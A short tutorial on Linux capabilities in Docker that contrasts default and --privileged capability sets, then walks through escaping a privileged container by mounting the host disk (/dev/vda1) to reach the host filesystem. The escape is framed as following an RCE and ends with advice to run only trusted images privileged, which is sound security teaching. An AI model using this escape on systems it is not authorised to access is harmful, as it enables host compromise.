# Privileged containers

It turns out that the old binary era of being `root` and `nonroot` on Linux systems had ended.
There is a Linux feature called Capabilities that allow us to fine grain capabilities to users.

Even though inside containers we are root we don't have all of the capabilities that a root user on the host has.
Docker gives us a set of capabilities that deems safe to use inside containers (safe being not being able to escape to host for example).

When using `--privileged` flag we instruct Docker to give us all of the capabilities.

1. Check capabilities inside of a non privileged container

```bash
root@ubuntu-s-1vcpu-2gb-fra1-01:~# docker run --rm -it alpine sh
/ # cat /proc/1/status | grep -i eff
CapEff:	00000000a80425fb
/ #
```

We are checking `/proc/1/status` pseudo file to give us more information about process. Because we are inside container we know that we have
isolated process ID and the parent process of the container is `1`.

On a host where we have `capsh` installed we can use it to decode this hex string.

```bash
root@ubuntu-s-1vcpu-2gb-fra1-01:~# capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

2. Check capabilities inside of a privileged container

```bash
root@ubuntu-s-1vcpu-2gb-fra1-01:~# docker run --rm -it --privileged alpine sh
/ # cat /proc/1/status | grep -i eff
CapEff:	000001ffffffffff
```

Decode:

```bash
root@ubuntu-s-1vcpu-2gb-fra1-01:~# capsh --decode=000001ffffffffff
0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
```

3. There is a saying that a privileged container **IS NOT** a container.

And they are right. We can easily escape to host.

Spawn privileged container (let's imagine we gained control to it through some RCE vulnerability):

```bash
root@ubuntu-s-1vcpu-2gb-fra1-01:~# docker run --rm -it --privileged alpine sh
/ #
```

Because I'm privileged I have access to devices.

```bash
/ # ls /dev
autofs           loop-control     ptmx             tty15            tty32            tty5             ttyS0            ttyS26           vcs2             vda
btrfs-control    loop0            pts              tty16            tty33            tty50            ttyS1            ttyS27           vcs3             vda1
bus              loop1            random           tty17            tty34            tty51            ttyS10           ttyS28           vcs4             vda14
...
```

So I can find host drive and mount it.

```bash
/ # mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/6YXLGS3DHZGOH3K2JXLDHUO7CX:/var/lib/docker/overlay2/l/MVOIBV5JYU7UC4CPDI4E22L2RX,upperdir=/var/lib/docker/overlay2/50ec948973cde0cc185e508728e6520958d915b639c767fd65e5630fad942663/diff,workdir=/var/lib/docker/overlay2/50ec948973cde0cc185e508728e6520958d915b639c767fd65e5630fad942663/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/vda1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/vda1 on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
```

```bash
mkdir /tmp/hostroot
mount /dev/vda1 /tmp/hostroot
/ # ls /tmp/hostroot/
bin         dev         home        lib32       libx32      media       opt         root        sbin        srv         tmp         var
boot        etc         lib         lib64       lost+found  mnt         proc        run         snap        sys         usr
```

And now I have access to host file system.

## Run only trusted images with --privileged flag.
